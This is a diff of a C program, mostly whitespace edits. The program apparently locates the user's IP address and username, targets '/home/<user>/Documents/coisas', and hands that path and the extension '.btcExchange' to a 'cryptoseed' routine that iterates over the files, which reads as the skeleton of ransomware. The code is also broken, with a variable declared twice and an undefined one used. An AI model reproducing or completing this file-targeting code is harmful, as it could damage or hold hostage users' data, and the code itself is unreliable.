@@ -54,10 +54,9 @@ int main() {
         struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)res->ai_addr;
         addr = &(ipv6->sin6_addr);
     }
+    
     inet_ntop(res->ai_family, addr, ip_address, sizeof(ip_address));
-
     printf("User ip is exposed, ip_adress: %s\n", ip_address);
-
     freeaddrinfo(res);
 
     uid = getuid();
@@ -66,18 +65,16 @@ int main() {
         perror("getpwuid");
         return 1;
     }
+    
     username = pw->pw_name;
     printf("Username located -> %s ✅\n", username);
-
+    
     const char* folderPath = "/home/%s/Documents/coisas";
-
     char fullPath[512];
     sprintf(fullPath, folderPath, username);
-
-    const char* ExtensionChange = ".btcExchange";
     
+    const char* ExtensionChange = ".btcExchange";
     cryptoseed(fullPath, ExtensionChange);
-
     return 0;
 }
 
@@ -89,6 +86,7 @@ void cryptoseed(const char* folderPath, const char* ExtensionChange) {
     if (pw == NULL) {
         perror("getpwuid");
     }
+    
     username = pw->pw_name;
     printf("(cryptoseed) * Username located -> %s ✅\n", username);
 
@@ -98,7 +96,6 @@ void cryptoseed(const char* folderPath, const char* ExtensionChange) {
     }
 
     const char* fullPath = "/home/%s/Documents/BackupMicro"; 
-
     char fullPath[512];
     sprintf(fullPath, backupFolderPath, username);
 
@@ -107,7 +104,7 @@ void cryptoseed(const char* folderPath, const char* ExtensionChange) {
         closedir(directory);
         return;
     }
-
+    
     struct dirent* entry;
     while ((entry = readdir(directory)) != NULL) {
         if (entry->d_type == DT_REG) {
